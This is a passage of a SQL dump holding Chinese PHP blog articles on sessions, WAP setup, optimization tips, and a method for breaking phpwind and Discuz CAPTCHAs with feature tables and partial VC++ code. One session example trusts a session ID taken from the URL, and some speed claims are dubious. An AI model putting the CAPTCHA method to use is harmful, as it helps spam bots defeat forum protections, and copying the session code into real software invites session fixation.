&lt;br /&gt;\r\n&lt;br /&gt;\r\nif (!emptyempty($userInfo)) { &lt;br /&gt;\r\n// 当验证通过后，启动 Session &lt;br /&gt;\r\nsession_start(); &lt;br /&gt;\r\n// **登陆成功的 admin 变量，并赋值 true &lt;br /&gt;\r\n$_SESSION[\\&quot;admin\\&quot;] = true; &lt;br /&gt;\r\n} else { &lt;br /&gt;\r\ndie(\\&quot;用户名密码错误\\&quot;); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n?&amp;gt; &lt;br /&gt;\r\n&lt;br /&gt;\r\n　我们在需要用户验证的页面启动 Session，判断是否登陆： &lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\n// 防止全局变量造成安全隐患 &lt;br /&gt;\r\n$admin = false; &lt;br /&gt;\r\n// 启动会话，这步必不可少 &lt;br /&gt;\r\nsession_start(); &lt;br /&gt;\r\n// 判断是否登陆 &lt;br /&gt;\r\nif (isset($_SESSION[\\&quot;admin\\&quot;]) &amp;amp;&amp;amp; $_SESSION[\\&quot;admin\\&quot;] === true) { &lt;br /&gt;\r\necho \\&quot;您已经成功登陆\\&quot;; &lt;br /&gt;\r\n} else { &lt;br /&gt;\r\n// 验证失败，将 $_SESSION[\\&quot;admin\\&quot;] 置为 false &lt;br /&gt;\r\n$_SESSION[\\&quot;admin\\&quot;] = false; &lt;br /&gt;\r\ndie(\\&quot;您无权访问\\&quot;); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n?&amp;gt; &lt;br /&gt;\r\n&lt;br /&gt;\r\n　　是不是很简单呢？将 $_SESSION 看成是存储在服务器端的数组即可，我们**的每一个变量都是数组的键，跟使用数组没有什么分别。 &lt;br /&gt;\r\n　　如果要登出系统怎么办？销毁 Session 即可。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\nsession_start(); &lt;br /&gt;\r\n// 这种方法是将原来**的某个变量销毁 &lt;br /&gt;\r\nunset($_SESSION[''admin'']); &lt;br /&gt;\r\n// 这种方法是销毁整个 Session 文件 &lt;br /&gt;\r\nsession_destroy(); &lt;br /&gt;\r\n?&amp;gt; &lt;br /&gt;\r\n&lt;br /&gt;\r\n　　Session 能否像 Cookie 那样设置生存周期呢？有了 Session 是否就完全抛弃 Cookie 呢？我想说，结合 Cookie 来使用 Session 才是最方便的。 &lt;br /&gt;\r\n　　Session 是如何来判断客户端用户的呢？它是通过 Session ID 来判断的，什么是 Session ID，就是那个 Session 文件的文件名，Session ID 是随机生成的，因此能保证唯一性和随机性，确保 Session 的安全。一般如果没有设置 Session 的生存周期，则 Session ID 存储在内存中，关闭浏览器后该 ID 自动注销，重新请求该页面后，重新**一个 Session ID。 &lt;br /&gt;\r\n　　如果客户端没有禁用 Cookie，则 Cookie 在启动 Session 会话的时候扮演的是存储 Session ID 和 Session 生存期的角色。 &lt;br /&gt;\r\n　　我们来手动设置 Session 的生存期： &lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\nsession_start(); &lt;br /&gt;\r\n// 保存一天 &lt;br /&gt;\r\n$lifeTime = 24 * 3600; &lt;br /&gt;\r\nsetcookie(session_name(), session_id(), time() + $lifeTime, \\&quot;/\\&quot;); &lt;br /&gt;\r\n?&amp;gt; &lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　其实 Session 还提供了一个函数 session_set_cookie_params(); 来设置 Session 的生存期的，该函数必须在 session_start() 函数调用之前调用： &lt;br /&gt;\r\n&lt;br /&gt;\r\nview plaincopy to clipboardprint? &lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\n// 保存一天 &lt;br /&gt;\r\n$lifeTime = 24 * 3600; &lt;br /&gt;\r\nsession_set_cookie_params($lifeTime); &lt;br /&gt;\r\nsession_start(); &lt;br /&gt;\r\n$_SESSION[\\&quot;admin\\&quot;] = true; &lt;br /&gt;\r\n?&amp;gt; &lt;br /&gt;\r\n&lt;br /&gt;\r\n　　如果客户端使用 IE 6.0 ， session_set_cookie_params(); 函数设置 Cookie 会有些问题，所以我们还是手动调用 setcookie 函数来创建 cookie。 &lt;br /&gt;\r\n　　假设客户端禁用 Cookie 怎么办？没办法，所有生存周期都是浏览器进程了，只要关闭浏览器，再次请求页面又得重新** Session。那么怎么传递 Session ID 呢？通过 URL 或者通过隐藏表单来传递，PHP 会自动将 Session ID 发送到 URL 上，其中 URL 中的参数 PHPSESSID 就是 Session ID了，我们可以使用 $_GET 来获取该值，从而实现 Session ID 页面间传递。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\n// 保存一天 &lt;br /&gt;\r\n$lifeTime = 24 * 3600; &lt;br /&gt;\r\n// 取得当前 Session 名，默认为 PHPSESSID &lt;br /&gt;\r\n$sessionName = session_name(); &lt;br /&gt;\r\n// 取得 Session ID &lt;br /&gt;\r\n$sessionID = $_GET[$sessionName]; &lt;br /&gt;\r\n// 使用 session_id() 设置获得的 Session ID &lt;br /&gt;\r\nsession_id($sessionID); &lt;br /&gt;\r\n&lt;br /&gt;\r\nsession_set_cookie_params($lifeTime); &lt;br /&gt;\r\nsession_start(); &lt;br /&gt;\r\n$_SESSION[''admin''] = true; &lt;br /&gt;\r\n?&amp;gt; &lt;br /&gt;\r\n&lt;br /&gt;\r\n　　对于虚拟主机来说，如果所有用户的 Session 都保存在系统临时文件夹里，将给维护造成困难，而且降低了安全性，我们可以手动设置 Session 文件的保存路径，session_save_path() 就提供了这样一个功能。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\n// 设置一个存放目录 &lt;br /&gt;\r\n$savePath = ''./session_save_dir/''; &lt;br /&gt;\r\n// 保存一天 &lt;br /&gt;\r\n$lifeTime = 24 * 3600; &lt;br /&gt;\r\nsession_save_path($savePath); &lt;br /&gt;\r\nsession_set_cookie_params($lifeTime); &lt;br /&gt;\r\nsession_start(); &lt;br /&gt;\r\n$_SESSION[''admin''] = true; &lt;br /&gt;\r\n?&amp;gt; &lt;br /&gt;\r\n&lt;br /&gt;\r\n　　我们还可以将数组，对象存储在 Session 中。操作数组和操作一般变量没有什么区别，而保存对象的话，PHP 会自动对对象进行序列化（也叫串行化），然后保存于 Session 中。下面例子说明了这一点： &lt;br /&gt;\r\nperson.php &lt;br /&gt;\r\nview plaincopy to clipboardprint? &lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\nclass person { &lt;br /&gt;\r\nvar $age; &lt;br /&gt;\r\nfunction output() { &lt;br /&gt;\r\necho $this-&amp;gt;age; &lt;br /&gt;\r\n} &lt;br /&gt;\r\nfunction setAge($age) { &lt;br /&gt;\r\n$this-&amp;gt;age = $age; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\n?&amp;gt; &lt;br /&gt;\r\n&lt;br /&gt;\r\nsetage.php &lt;br /&gt;\r\nview plaincopy to clipboardprint? &lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\nsession_start(); &lt;br /&gt;\r\nrequire_once ''person.php''; &lt;br /&gt;\r\n$person = new person(); &lt;br /&gt;\r\n$person-&amp;gt;setAge(21); &lt;br /&gt;\r\n$_SESSION[''person''] = $person; &lt;br /&gt;\r\necho ''&amp;lt;a href=''output.php''&amp;gt;check here to output age&amp;lt;/a&amp;gt;''; &lt;br /&gt;\r\n?&amp;gt; &lt;br /&gt;\r\n&lt;br /&gt;\r\noutput.php &lt;br /&gt;\r\nview plaincopy to clipboardprint? &lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\nini_set(''unserialize_callback_func'', ''mycallback''); &lt;br /&gt;\r\nfunction mycallback($classname) { &lt;br /&gt;\r\ninclude_once $classname . ''.php''; &lt;br /&gt;\r\n} &lt;br /&gt;\r\nsession_start(); &lt;br /&gt;\r\n$person = $_SESSION[''person'']; &lt;br /&gt;\r\n// 输出 21 &lt;br /&gt;\r\n$person-&amp;gt;output(); &lt;br /&gt;\r\n?&amp;gt; &lt;br /&gt;\r\n&lt;br /&gt;\r\n　　另外，我们还可以使用 session_set_save_handler 函数来自定义 Session 的调用方式。 &lt;br /&gt;\r\n', 1, 1, 0, 0, 1301375879, 1, 'admin'),
(6, 1, 'PHP Wap开发环境配置', '', '', '&lt;font color=&quot;#008000&quot;&gt;WAP(无线通讯协议)是在数字移动电话、个人手持设备(PDA等)及计算机之间进行通讯的开放性全球标准协议。随着无线通讯的不断发展，静态的WAP页面在很多方面已经不能满足用户个性化的要求，因此开发者可以在WAP服务器端使用诸如PHP等语言产生动态的WML页面，来满足用户的需要。&lt;/font&gt; &lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;WAP的应用结构非常类似于Internet，一个典型的WAP应用请求步骤描述如下：&lt;/span&gt; &lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;　 1. 具有WAP用户代理功能的移动终端(如WAP手机)，通过内部运行的微浏览器向某一网站发送WAP服务请求。该请求先由WAP网关截获，对信息内容进行编码压缩，以减少网络数据流量，同时根据需要将WAP协议转换成HTTP协议。&lt;/span&gt; &lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;　 2. 协议将处理后的请求转送到相应WAP服务器。在WAP服务器端，根据页面扩展名等属性，被请求的页面直接或由服务器端脚本解释后输出，再经过网关传回给用户。&lt;/span&gt; &lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;介绍了一些知识现在开始开发环境的搭建了。因为我是用php和apache开发wap站点的。所以在apache的http.conf文件的AddType部分加入以下部分。&lt;/span&gt; &lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;&lt;blockquote class=&quot;blockquote3&quot;&gt;&lt;div class=&quot;quote&quot;&gt;引用 &lt;/div&gt;\r\n&lt;div class=&quot;text&quot;&gt;&lt;span style=&quot;color:#008000;&quot;&gt;AddType text/vnd.wap.wml .wml &lt;br /&gt;\r\nAddType application/vnd.wap.wmlc .wmlc &lt;br /&gt;\r\nAddType text/vnd.wap.wmls .wmls &lt;br /&gt;\r\nAddType application/vnd.wap.wmlsc .wmlsc &lt;br /&gt;\r\nAddType image/vnd.wap.wbmp .wbmp &lt;br /&gt;\r\nAddType image/vnd.wap.wbmp .wbmp　&lt;/span&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;重启Apache，这就OK了&lt;/span&gt;&lt;font color=&quot;#333333&quot;&gt; &lt;br /&gt;\r\n&lt;/font&gt;&lt;span style=&quot;color:#008000;&quot;&gt;测试性代码&lt;/span&gt;&lt;font color=&quot;#333333&quot;&gt; &lt;br /&gt;\r\n&lt;/font&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&lt;blockquote class=&quot;blockquote3&quot;&gt;&lt;div class=&quot;quote&quot;&gt;引用 &lt;/div&gt;\r\n&lt;div class=&quot;text&quot;&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;&lt;?php&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;header(”Content－type: text/vnd.wap.wml”);&lt;/span&gt; &lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;echo(”&lt;?xml version=\\”1.0\\”&gt;\\n”);&lt;/span&gt; &lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;echo “http://wapforum.org//DTD//wml_1.1.xml&lt;/a&gt;\\”&amp;gt;\\n”;&lt;/span&gt; &lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;echo (”&lt;wml&gt;\\n&lt;card&gt;\\n &lt;p&gt;”);&lt;/span&gt; &lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;echo date(”l dS of F Y h:i A”).”&lt;br /&gt;\r\n\\n”;&lt;/span&gt; &lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;echo ‘Hello World!，你好’;&lt;/span&gt; &lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;echo (”&lt;/p&gt;\r\n\\n&lt;/card&gt;\\n&lt;/wml&gt;”);&lt;/span&gt; &lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;?&amp;gt;&lt;/span&gt; &lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;可以用opera浏览器浏览该测试内容,opera支持wap站点浏览&lt;/span&gt; &lt;br /&gt;\r\n&lt;/span&gt;', 1, 1, 0, 0, 1301376164, 1, 'admin'),
(7, 1, 'php优化技巧', 'php,优化技巧', '', '1. 尽量采用大量的PHP内置函数。&lt;br /&gt;\r\n&lt;br /&gt;\r\n2. echo 比 print 快。&lt;br /&gt;\r\n&lt;br /&gt;\r\n3. 不要把方法细分得过多，仔细想想你真正打算重用的是哪些代码？&lt;br /&gt;\r\n&lt;br /&gt;\r\n4. 在执行for循环之前确定最大循环数，不要每循环一次都计算最大值。&lt;br /&gt;\r\n&lt;br /&gt;\r\n5. 注销那些不用的变量尤其是大数组，以便释放内存。&lt;br /&gt;\r\n&lt;br /&gt;\r\n6.&amp;nbsp;&amp;nbsp;并非要用类实现所有的数据结构，数组也很有用。&lt;br /&gt;\r\n&lt;br /&gt;\r\n7.&amp;nbsp; &amp;nbsp;$row[‘id’]的效率是$row[id]的7倍。&lt;br /&gt;\r\n&lt;br /&gt;\r\n8. 在包含文件时使用完整路径，解析&lt;span href=&quot;http://www.canphp.com/bbs/tag.php?name=%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F&quot; class=&quot;t_tag&quot;&gt;操作系统&lt;/span&gt;路径所需的&lt;span href=&quot;http://www.canphp.com/bbs/tag.php?name=%E6%97%B6%E9%97%B4&quot; class=&quot;t_tag&quot;&gt;时间&lt;/span&gt;会更少。&lt;br /&gt;\r\n&lt;br /&gt;\r\n9. 如果你想知道脚本开始执行（译注：即&lt;span href=&quot;http://www.canphp.com/bbs/tag.php?name=%E6%9C%8D%E5%8A%A1%E5%99%A8&quot; class=&quot;t_tag&quot;&gt;服务器&lt;/span&gt;端收到&lt;span href=&quot;http://www.canphp.com/bbs/tag.php?name=%E5%AE%A2%E6%88%B7%E7%AB%AF&quot; class=&quot;t_tag&quot;&gt;客户端&lt;/span&gt;请求）的时刻，使用$_SERVER[‘REQUEST_TIME’]要好于time()。&lt;br /&gt;\r\n&lt;br /&gt;\r\n10. 检查是否能用strncasecmp，strpbrk，stripos函数代替正则表达式完成相同功能。&lt;br /&gt;\r\n&lt;br /&gt;\r\n11. str_replace函数比preg_replace函数快，但strtr函数的效率是str_replace函数的四倍。&lt;br /&gt;\r\n&lt;br /&gt;\r\n12. 如果一个字符串替换函数，可接受数组或字符作为参数，并且参数长度不太长，那么可以考虑额外写一段替换代码，使得每次传递参数是一个字符，而不是只写一行代码接受数组作为查询和替换的参数。&lt;br /&gt;\r\n&lt;br /&gt;\r\n13.&amp;nbsp;&amp;nbsp;使用选择分支语句（译注：即switch case）好于使用多个if，else if语句。&lt;br /&gt;\r\n&lt;br /&gt;\r\n14.&amp;nbsp;&amp;nbsp;用@屏蔽错误消息的做法非常低效。&lt;br /&gt;\r\n&lt;br /&gt;\r\n15.&amp;nbsp; &amp;nbsp;打开apache的mod_deflate模块。&lt;br /&gt;\r\n&lt;br /&gt;\r\n16.&amp;nbsp; &amp;nbsp;&lt;span href=&quot;http://www.canphp.com/bbs/tag.php?name=%E6%95%B0%E6%8D%AE%E5%BA%93&quot; class=&quot;t_tag&quot;&gt;数据库&lt;/span&gt;连接当使用完毕时应关掉。&lt;br /&gt;\r\n&lt;br /&gt;\r\n18.&amp;nbsp; &amp;nbsp;错误消息代价昂贵。&lt;br /&gt;\r\n&lt;br /&gt;\r\n19.&amp;nbsp;&amp;nbsp;尽量不要在for循环中使用函数，比如for ($x=0; $x &amp;lt; count($array); $x)每循环一次都会调用count()函数。&lt;br /&gt;\r\n&lt;br /&gt;\r\n20.&amp;nbsp; &amp;nbsp;在方法中递增局部变量，速度是最快的。几乎与在函数中调用局部变量的速度相当。&lt;br /&gt;\r\n&lt;br /&gt;\r\n21.&amp;nbsp; &amp;nbsp;递增一个全局变量要比递增一个局部变量慢2倍。&lt;br /&gt;\r\n&lt;br /&gt;\r\n22.&amp;nbsp; &amp;nbsp;递增一个&lt;span href=&quot;http://www.canphp.com/bbs/tag.php?name=%E5%AF%B9%E8%B1%A1&quot; class=&quot;t_tag&quot;&gt;对象&lt;/span&gt;属性（如：$this-&amp;gt;prop++）要比递增一个局部变量慢3倍。&lt;br /&gt;\r\n&lt;br /&gt;\r\n23.&amp;nbsp; &amp;nbsp;递增一个未预定义的局部变量要比递增一个预定义的局部变量慢9至10倍。&lt;br /&gt;\r\n&lt;br /&gt;\r\n24.&amp;nbsp; &amp;nbsp; 仅定义一个局部变量而没在函数中调用它，同样会减慢速度（其程度相当于递增一个局部变量）。PHP大概会检查看是否存在全局变量。&lt;br /&gt;\r\n&lt;br /&gt;\r\n25.&amp;nbsp;&amp;nbsp;方法调用看来与类中定义的方法的数量无关，因为我（在测试方法之前和之后都）添加了10个方法，但性能上没有变化。&lt;br /&gt;\r\n&lt;br /&gt;\r\n26.&amp;nbsp;&amp;nbsp;派生类中的方法运行起来要快于在基类中定义的同样的方法。&lt;br /&gt;\r\n&lt;br /&gt;\r\n27.&amp;nbsp;&amp;nbsp;调用带有一个参数的空函数，其花费的时间相当于执行7至8次的局部变量递增操作。类似的方法调用所花费的时间接近于15次的局部变量递增操作。&lt;br /&gt;\r\n&lt;br /&gt;\r\n28.&amp;nbsp;&amp;nbsp;用单引号代替双引号来包含字符串，这样做会更快一些。因为PHP会在双引号包围的字符串中搜寻变量，单引号则不会。当然，只有当你不需要在字符串中包含变量时才可以这么做。&lt;br /&gt;\r\n&lt;br /&gt;\r\n29.&amp;nbsp;&amp;nbsp;用echo 输出多个字符串时，用逗号代替句点来分隔字符串，速度更快。&lt;br /&gt;\r\n&lt;br /&gt;\r\n30.&amp;nbsp;&amp;nbsp;Apache解析一个PHP脚本的时间要比解析一个静态HTML页面慢2至10倍。尽量多用静态HTML页面，少用脚本。&lt;br /&gt;\r\n&lt;br /&gt;\r\n31.&amp;nbsp;&amp;nbsp;除非脚本可以缓存，否则每次调用时都会重新编译一次。引入一套PHP缓存机制通常可以提升25%至100%的性能，以免除编译开销。&lt;br /&gt;\r\n&lt;br /&gt;\r\n32. 尽量做缓存，可使用memcached。memcached是一款高性能的内存对象缓存系统，可用来加速动态Web&lt;span href=&quot;http://www.canphp.com/bbs/tag.php?name=%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F&quot; class=&quot;t_tag&quot;&gt;应用程序&lt;/span&gt;，减轻数据库负载。对运算码(OP code)的缓存很有用，使得脚本不必为每个请求做重新编译。&lt;br /&gt;\r\n&lt;br /&gt;\r\n33. 当操作字符串并需要检验其长度是否满足某种要求时，你想当然地会使用strlen()函数。此函数执行起来相当快，因为它不做任何计算，只返回在zval 结构（C的内置数据结构，用于存储PHP变量）中存储的已知字符串长度。但是，由于strlen()是函数，多多少少会有些慢，因为函数调用会经过诸多步骤，如字母小写化（译注：指函数名小写化，PHP不区分函数名大小写）、哈希查找，会跟随被调用的函数一起执行。在某些情况下，你可以使用isset() &lt;span href=&quot;http://www.canphp.com/bbs/tag.php?name=%E6%8A%80%E5%B7%A7&quot; class=&quot;t_tag&quot;&gt;技巧&lt;/span&gt;加速执行你的代码。&lt;br /&gt;\r\n&lt;br /&gt;\r\nEx.（举例如下）&lt;br /&gt;\r\nif (strlen($foo) &amp;lt; 5) { echo &quot;Foo is too short&quot;; }&lt;br /&gt;\r\nvs.（与下面的技巧做比较）&lt;br /&gt;\r\nif (!isset($foo{5})) { echo &quot;Foo is too short&quot;; }&lt;br /&gt;\r\n&lt;br /&gt;\r\n调用isset()恰巧比strlen()快，因为与后者不同的是，isset()作为一种语言结构，意味着它的执行不需要函数查找和字母小写化。也就是说，实际上在检验字符串长度的顶层代码中你没有花太多开销。&lt;br /&gt;\r\n&lt;br /&gt;\r\n34. 当执行变量$i的递增或递减时，$i++会比++$i慢一些。这种差异是PHP特有的，并不适用于其他语言，所以请不要修改你的C或Java代码并指望它们能立即变快，没用的。++$i更快是因为它只需要3条指令(opcodes)，$i++则需要4条指令。后置递增实际上会产生一个临时变量，这个临时变量随后被递增。而前置递增直接在原值上递增。这是最优化处理的一种，正如Zend的PHP优化器所作的那样。牢记这个优化处理不失为一个好主意，因为并不是所有的指令优化器都会做同样的优化处理，并且存在大量没有装配指令优化器的&lt;span href=&quot;http://www.canphp.com/bbs/tag.php?name=%E4%BA%92%E8%81%94%E7%BD%91&quot; class=&quot;t_tag&quot;&gt;互联网&lt;/span&gt;服务提供商（ISPs）和服务器。&lt;br /&gt;\r\n&lt;br /&gt;\r\n35.&amp;nbsp;&amp;nbsp;并不是事必面向对象(OOP)，面向对象往往开销很大，每个方法和对象调用都会消耗很多内存。&lt;br /&gt;\r\n&lt;br /&gt;\r\n36.&amp;nbsp;&amp;nbsp;如果在代码中存在大量耗时的函数，你可以考虑用C扩展的方式实现它们。&lt;br /&gt;\r\n&lt;br /&gt;\r\n37.&amp;nbsp;&amp;nbsp;评估检验(profile)你的代码。检验器会告诉你，代码的哪些部分消耗了多少时间。Xdebug调试器包含了检验程序，评估检验总体上可以显示出代码的瓶颈。&lt;br /&gt;\r\n&lt;br /&gt;\r\n38. mod_zip可作为Apache模块，用来即时压缩你的数据，并可让数据传输量降低80%。', 1, 1, 0, 0, 1301472557, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(8, 1, 'phpwind和discuz的验证码识别', 'phpwind,discuz,验证码识别', '前段时间做了phpwind和discuz的验证码识别，phpwind6.0以前的验证码和discuz最新的验证码如果在不改变后台验证码配置的情况下，识别正确率几乎可以达到100%，现在跟大家分享一下识别方法。', '&lt;p&gt;验证码(captcha)是伴随自动提交程序(spam)的出现而出现的。现在各种论坛、博客、投票等程序都带有验证码功能。大部分验证码都比较容 易识别，只需要简单对照一下特征码就可以得到百分之百准确的结果。也有稍微复杂一点的，比如phpwind和discuz的验证码。&lt;/p&gt;\r\n &lt;p&gt;前段时间做了phpwind和discuz的验证码识别，phpwind6.0以前的验证码和discuz最新的验证码如果在不改变后台验证码配置的情况下，识别正确率几乎可以达到100%，现在跟大家分享一下识别方法。&lt;/p&gt;\r\n &lt;p&gt;验证码识别一般分为以下几个步骤：&lt;/p&gt;\r\n &lt;ol&gt;&lt;li&gt;取出字模&lt;/li&gt;\r\n&lt;li&gt;二值化&lt;/li&gt;\r\n&lt;li&gt;计算特征&lt;/li&gt;\r\n&lt;li&gt;对照样本&lt;/li&gt;\r\n&lt;/ol&gt;\r\n &lt;p&gt;各种验证码在具体的步骤上操作会有所不同。&lt;/p&gt;\r\n &lt;p&gt;我的程序是用VC++写的，这里不贴详细代码了，只讲识别方法。&lt;/p&gt;\r\n &lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;http://www.sbyzm.com/upload/200903220002431840.jpg&quot; /&gt;&lt;/p&gt;\r\n &lt;p&gt;先说phpwind验证码的识别方法：&lt;/p&gt;\r\n &lt;p&gt;具体分为这几步：&lt;/p&gt;\r\n &lt;ol&gt;&lt;li&gt;把图片横向等宽分为4块&lt;/li&gt;\r\n&lt;li&gt;找出每块图片中分布最多的一种颜色&lt;/li&gt;\r\n&lt;li&gt;与已有样本比较得出结果&lt;/li&gt;\r\n&lt;/ol&gt;\r\n &lt;p&gt;因为这个验证码的字符分布几乎是等宽的，所以我们首先把图片切为4份，这样方便取出每一个字符。分成4块后，通过每一块中的颜色值对比可以很快得到 字符的特征。因为每一块中字符的颜色值比杂点颜色值要多很多，而且字符是纯色的，所以只要统计出最多的一种颜色，然后去除其它颜色就可以得到只有字符的干 净图片。然后对图片二值化（即构造一个二维数组对应图片上有颜色的点，把有颜色的点的数组值置为1，无颜色的置为0），与样本比对即可得到字符。当然首先 要得到样本。样本的制作与上面分析的步骤一致。经过测试，上面这种方法的识别率是100%的，不会有差错。&lt;/p&gt;\r\n &lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;http://www.sbyzm.com/upload/200903220002430117.jpg&quot; /&gt;&lt;/p&gt;\r\n &lt;p&gt;discuz的验证码识别较之phpwind要稍难一点。因为图片带有不太容易去掉的背景。字符也不是单纯的字符，有阴影边框，而且不等宽，位置不确定。我们具体分为以下几步：&lt;/p&gt;\r\n &lt;ol&gt;&lt;li&gt;去除背景色&lt;/li&gt;\r\n&lt;li&gt;分出每一个字符区域&lt;/li&gt;\r\n&lt;li&gt;用轮廓法（berg）得到特征码&lt;/li&gt;\r\n&lt;li&gt;与样本比较得出结果&lt;/li&gt;\r\n&lt;/ol&gt;\r\n &lt;p&gt;这个背景色是渐变的而字符的颜色是不变的。首先去除对角线上找不到相同颜色的点，然后统计出每一种颜色占用的区域的宽度和高度。去除占用区域高度小 于图片总高度1/5或大于图片总高度2/3的点，因为一个字符不可能达到这种尺寸。再去除密度（即颜色点数/颜色所占的区域宽高的积）小于15%的点。剩 下的就只有干净的字符的颜色点了。&lt;/p&gt;\r\n &lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;http://www.sbyzm.com/upload/200903220002434485.jpg&quot; /&gt;&lt;/p&gt;\r\n &lt;p&gt;把这些点分为4份。（分割的办法为从左到右用一条竖直的线扫描，扫描线经过的连续区域就是字符区域。）分成4个字符块后，我们就可以对每一个字符块进行轮廓特征取值。&lt;/p&gt;\r\n &lt;p&gt;什么是轮廓法？我是由berg（berg是网易社区的牛人，对我帮助不少）那里获知验证码识别中的轮廓法。即将一个字模点阵，以四条直线由上下左右 4个方向向字符中心扫描，遇到点即停下，把每一条线通过的路径长度记下。然后以比路径长度和其它一些相关的参数得到正确的字符。&lt;/p&gt;\r\n &lt;p&gt;我稍微变换了一下轮廓法。即把4个方向上的路径长度变为波的形式。波峰记为1，波谷记为0，最后得到一个由1和0组成的特征串，与样本串比较即可得 到匹配结果。有几个字符，如V和Y、H和M、4和6等，得到的特征串可能是一样的，这样需要通过其它的一些参数来辅助得到结果。&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;下面是我计算的特征串和字符的对照样本：&lt;/span&gt;&lt;br /&gt;\r\n &lt;span style=&quot;font-family:verdana;&quot;&gt;10-10-10-10- X &lt;br /&gt;\r\n 1-1010-1-10101- W &lt;br /&gt;\r\n -1010--- W &lt;br /&gt;\r\n 1--1-101- T &lt;br /&gt;\r\n -1-1010-10- R &lt;br /&gt;\r\n --10-10- R &lt;br /&gt;\r\n 101-101-1010-1010- Q &lt;br /&gt;\r\n -1-101-1- P &lt;br /&gt;\r\n --1-1- P &lt;br /&gt;\r\n -10--1010- M &lt;br /&gt;\r\n -10-10-10- K &lt;br /&gt;\r\n 10-10-1-1- J &lt;br /&gt;\r\n 10-10--- J &lt;br /&gt;\r\n 101-101-1010-10- G &lt;br /&gt;\r\n --101-1- F &lt;br /&gt;\r\n --1010-- E &lt;br /&gt;\r\n 101-101-10101-101- C &lt;br /&gt;\r\n 101-10-10-10- C &lt;br /&gt;\r\n -1-10101-1- B &lt;br /&gt;\r\n ---- B &lt;br /&gt;\r\n 10101-101-101-101- 9 &lt;br /&gt;\r\n 1---10- 9 &lt;br /&gt;\r\n -101--- 8 &lt;br /&gt;\r\n 10--1-101- 7 &lt;br /&gt;\r\n -1-10-- 6 &lt;br /&gt;\r\n 1-101-10-101- 4 &lt;br /&gt;\r\n 1010---- 3 &lt;br /&gt;\r\n 1010-101-1010-- 2 &lt;br /&gt;\r\n 10--10-- 2 &lt;br /&gt;\r\n //below is equivocal&lt;br /&gt;\r\n 1-10-1-101- V&amp;nbsp; //Y&lt;br /&gt;\r\n 10-10-10-- G&amp;nbsp; //Q&lt;br /&gt;\r\n -10--10- H&amp;nbsp; //M&lt;br /&gt;\r\n 10101-101-10101-101- 3&amp;nbsp; //8&lt;br /&gt;\r\n 101-101-101-101- 4&amp;nbsp; //6&lt;/span&gt;&lt;/p&gt;\r\n &lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n &lt;p&gt;上面这种方法，对discuz的默认验证码，即如图所示的验证码识别正确率为100%&lt;/p&gt;\r\n &lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n &lt;p&gt;上面对phpwind和discuz的验证码识别方法均没有用到高级的算法，更加没有用到人工智能的知识，不免有点遗憾，不过准确率相当高，也容易看懂。&lt;/p&gt;\r\n &lt;p&gt;在实际应用中可能遇到一些问题，比如discuz验证码可以在后台设为gif图片格式。如何把gif动画中那一个字符帧转为bmp图片呢？下面是VC里面的方法：&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;BOOL CCaptchaBreak::Gif2Bmp(CString &amp;amp;sPath)&lt;br /&gt;\r\n {&lt;br /&gt;\r\n &amp;nbsp;ULONG_PTR&amp;nbsp;&amp;nbsp; GdippToken;&amp;nbsp;&amp;nbsp; &lt;br /&gt;\r\n &amp;nbsp;GdiplusStartupInput&amp;nbsp;&amp;nbsp; GdippStart;&amp;nbsp;&amp;nbsp; &lt;br /&gt;\r\n 